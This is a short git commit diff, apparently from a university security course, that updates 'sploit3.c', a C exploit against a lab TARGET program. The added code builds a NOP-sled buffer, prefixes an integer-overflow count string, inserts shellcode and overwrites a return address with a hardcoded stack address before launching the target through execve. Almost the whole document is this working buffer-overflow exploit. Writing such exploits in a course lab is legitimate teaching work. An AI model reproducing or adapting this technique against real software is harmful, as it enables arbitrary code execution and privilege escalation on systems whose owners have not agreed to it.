9f73afc3f75d81c12f3ee9be908a52d35c637091
ajsaad <ajsaad@wisc.edu>
2016-02-20 12:43:57 -0600

    Update sploit3.c
    got sploit3 first try

--- sploits/sploit3.c
+++ sploits/sploit3.c
@@ -10,8 +10,14 @@ int main(void)
 {
   char *args[3];
   char *env[1];
+  char buffer[241*20];
+  memset(buffer, 0x90, 241*20);
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  strncpy(buffer, "2147483889,", 11);
+  strncpy(buffer+(235*20), shellcode, 45);
+  strncpy(buffer+(240*20)+15, "\xfc\xfe\xff\xbf", 4);
+
+  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
